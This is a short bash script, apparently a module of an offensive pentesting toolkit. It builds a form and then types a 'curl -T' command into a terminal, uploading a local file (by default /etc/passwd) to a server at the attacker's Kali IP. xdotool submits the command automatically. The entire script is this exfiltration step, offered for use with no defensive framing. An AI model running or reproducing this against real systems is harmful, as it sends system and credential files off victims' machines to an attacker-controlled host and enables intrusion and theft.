#!/bin/bash

: '
curl: upload file to upload server
'

# Generate GUI form items (label, type (optional: default text), name, default (optional))
UPLOAD_PORT_FIELD=$(form_item "upload server port" "number" "port" "80")
LOCAL_FILE_LOCATION_FIELD=$(form_item "local file location" "local_file" "/etc/passwd")
REMOTE_FILE_LOCATION_FIELD=$(form_item "remote upload file location" "upload_location" "passwd")

# Generate GUI form
generate_form "${UPLOAD_PORT_FIELD}" "${LOCAL_FILE_LOCATION_FIELD}" "${REMOTE_FILE_LOCATION_FIELD}"

UPLOAD_PORT=${form_data["port"]}
LOCAL_FILE_LOCATION=${form_data["local_file"]}
REMOTE_FILE_LOCATION=${form_data["upload_location"]}

paste_command "curl -T ${LOCAL_FILE_LOCATION} http://${KALI_IP}:${UPLOAD_PORT}/${REMOTE_FILE_LOCATION}"
xdotool key Return
